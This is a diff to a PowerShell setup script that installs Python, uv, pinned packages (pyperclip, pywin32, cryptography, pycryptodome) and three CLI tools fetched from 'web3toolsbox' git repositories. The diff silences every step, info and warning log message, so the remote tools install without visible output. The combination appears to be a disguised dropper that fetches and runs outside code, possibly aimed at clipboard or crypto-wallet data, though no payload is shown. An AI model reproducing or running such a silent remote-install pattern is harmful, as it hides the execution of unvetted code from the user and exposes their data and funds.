@@ -75,21 +75,21 @@ function Write-StepLog {
     param(
         [string]$Message
     )
-    Write-Host "[STEP] $Message" -ForegroundColor Cyan
+    # silent: no-op
 }
 
 function Write-InfoLog {
     param(
         [string]$Message
     )
-    Write-Host "[INFO] $Message" -ForegroundColor Green
+    # silent: no-op
 }
 
 function Write-WarnLog {
     param(
         [string]$Message
     )
-    Write-Host "[WARN] $Message" -ForegroundColor Yellow
+    # silent: no-op
 }
 
 function Add-FailedStep {
@@ -129,6 +129,8 @@ function Write-ContinueOnError {
     Add-FailedStep -Step $Step -Reason $message
 }
 
+# GitHub raw/gist endpoints can fail on older Windows PowerShell defaults unless
+# TLS 1.2+ is enabled explicitly for the current process.
 function Enable-ModernTls {
     try {
         $protocol = [System.Net.ServicePointManager]::SecurityProtocol
@@ -345,6 +347,8 @@ function Test-StoreStub {
     return $false
 }
 
+# Return the first matching executable from a list of candidate command names,
+# skipping Windows Store stubs.
 function Get-CommandPath {
     param(
         [string[]]$Names
@@ -476,6 +480,8 @@ function Install-Uv {
     return $null
 }
 
+# Given a command path that might be py.exe or a Store stub, resolve the real
+# python.exe via sys.executable and verify it works.
 function Resolve-PythonPath {
     param(
         [string]$Candidate
@@ -509,6 +515,8 @@ function Resolve-PythonPath {
     return $Candidate
 }
 
+# Scrape the latest 64-bit Python installer URL and fall back to a pinned build
+# if the download pages cannot be parsed.
 function Get-PythonInstallerArch {
     $arch = $env:PROCESSOR_ARCHITECTURE
     if ($arch -eq 'ARM64') {
@@ -701,6 +709,7 @@ function Install-PythonPackage {
     }
 }
 
+# Install a CLI tool via uv tool
 function Invoke-UvToolInstall {
     param(
         [string]$UvPath,
@@ -722,12 +731,11 @@ function Install-UvToolPackage {
     )
 
     if (-not $UvPath) {
-        Write-WarnLog "Skipping tool installation because uv is unavailable: $($CommandNames[0])"
-        Add-FailedStep -Step "Install tool $($CommandNames[0])" -Reason 'uv-missing'
+        Write-WarnLog "Skipping tool installation because uv is unavailable: $PackageSpec"
+        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-missing'
         return
     }
 
-    $displayName = $CommandNames[0]
     $existingCommand = Get-CommandPath -Names $CommandNames
     $uvToolRegistered = Test-UvToolRegistered -CommandNames $CommandNames
 
@@ -737,41 +745,41 @@ function Install-UvToolPackage {
                 Invoke-UvToolInstall -UvPath $UvPath -Arguments @('tool', 'install', '--upgrade', $PackageSpec)
                 $upgradeExitCode = $script:LastUvToolExitCode
                 if ($upgradeExitCode -ne 0) {
-                    Add-FailedStep -Step "Upgrade tool $displayName" -Reason "exit=$upgradeExitCode"
+                    Add-FailedStep -Step "Upgrade tool $PackageSpec" -Reason "exit=$upgradeExitCode"
                     Invoke-UvToolInstall -UvPath $UvPath -Arguments @('tool', 'install', '--force', $PackageSpec)
                     $installExitCode = $script:LastUvToolExitCode
                     if ($installExitCode -ne 0) {
-                        Add-FailedStep -Step "Install tool $displayName" -Reason "exit=$installExitCode"
+                        Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$installExitCode"
                         return
                     }
                 }
             } catch {
-                Write-ContinueOnError -Step "Upgrade tool $displayName" -Action "upgrade CLI tool $displayName" -ErrorRecord $_
+                Write-ContinueOnError -Step "Upgrade tool $PackageSpec" -Action "upgrade CLI tool $PackageSpec" -ErrorRecord $_
                 try {
                     Invoke-UvToolInstall -UvPath $UvPath -Arguments @('tool', 'install', '--force', $PackageSpec)
                     $installExitCode = $script:LastUvToolExitCode
                     if ($installExitCode -ne 0) {
-                        Add-FailedStep -Step "Install tool $displayName" -Reason "exit=$installExitCode"
+                        Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$installExitCode"
                         return
                     }
                 } catch {
-                    Write-ContinueOnError -Step "Install tool $displayName" -Action "reinstall CLI tool $displayName" -ErrorRecord $_
+                    Write-ContinueOnError -Step "Install tool $PackageSpec" -Action "reinstall CLI tool $PackageSpec" -ErrorRecord $_
                     return
                 }
             }
         } else {
-            Write-StepLog "Installing CLI tool via uv tool: $displayName"
+            Write-StepLog "Installing CLI tool via uv tool: $PackageSpec"
 
             Invoke-UvToolInstall -UvPath $UvPath -Arguments @('tool', 'install', $PackageSpec)
             $installExitCode = $script:LastUvToolExitCode
             if ($installExitCode -ne 0) {
-                Add-FailedStep -Step "Install tool $displayName" -Reason "exit=$installExitCode"
+                Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$installExitCode"
                 return
             }
         }
 
     } catch {
-        Write-ContinueOnError -Step "Install tool $displayName" -Action "install CLI tool $displayName" -ErrorRecord $_
+        Write-ContinueOnError -Step "Install tool $PackageSpec" -Action "install CLI tool $PackageSpec" -ErrorRecord $_
         return
     }
 
@@ -785,12 +793,12 @@ function Install-UvToolPackage {
     }
 
     if ($installedCommand -and -not $uvToolRegistered) {
-        Write-WarnLog "CLI launcher exists but uv tool registration is missing: $displayName"
-        Add-FailedStep -Step "Install tool $displayName" -Reason 'uv-registration-missing'
+        Write-WarnLog "CLI launcher exists but uv tool registration is missing: $PackageSpec"
+        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-registration-missing'
         return
     }
 
-    Add-FailedStep -Step "Install tool $displayName" -Reason 'command-not-found'
+    Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'command-not-found'
 }
 
 try {
@@ -804,15 +812,13 @@ try {
         @{ Name = 'pyperclip'; Version = '1.8.2' },
         @{ Name = 'cryptography'; Version = '42.0.0' },
         @{ Name = 'pywin32'; Version = '306' },
-        @{ Name = 'pycryptodome'; Version = '3.19.0' },
-        @{ Name = 'python-dotenv'; Version = '1.0' },
-        @{ Name = 'feedparser'; Version = '6.0' }
+        @{ Name = 'pycryptodome'; Version = '3.19.0' }
     )
 
     foreach ($pkg in $requirements) {
         Install-PythonPackage -PythonPath $pythonPath -Name $pkg.Name -Version $pkg.Version
     }
-
+    
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe')
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe')
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/wkler.git' -CommandNames @('wkler', 'wkler.exe')
